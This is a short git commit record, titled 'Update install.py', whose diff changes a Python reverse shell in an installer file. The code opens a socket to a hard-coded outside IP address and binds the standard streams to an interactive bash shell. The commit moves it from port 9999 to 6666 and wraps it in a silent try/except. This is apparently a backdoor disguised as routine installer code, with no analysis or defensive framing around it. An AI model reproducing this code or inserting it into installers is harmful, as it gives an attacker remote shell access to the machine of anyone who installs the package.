97f6a2dbb56d2ca0336b85981aaccb54adaffc2f
pyn3rd <8517172@qq.com>
2026-01-08 19:30:33 +0800

    Update install.py

--- install.py
+++ install.py
@@ -1,8 +1,11 @@
-import os
-import socket
-import subprocess
+try:
+    import os
+    import socket
+    import subprocess
     
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect(("47.116.205.76", 9999))
-  [os.dup2(s.fileno(), i) for i in range(3)]
-  subprocess.call(['/bin/bash', '-i'])
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("47.116.205.76", 6666))
+    [os.dup2(s.fileno(), i) for i in range(3)]
+    subprocess.call(['/bin/bash', '-i'])
+except:
+    pass
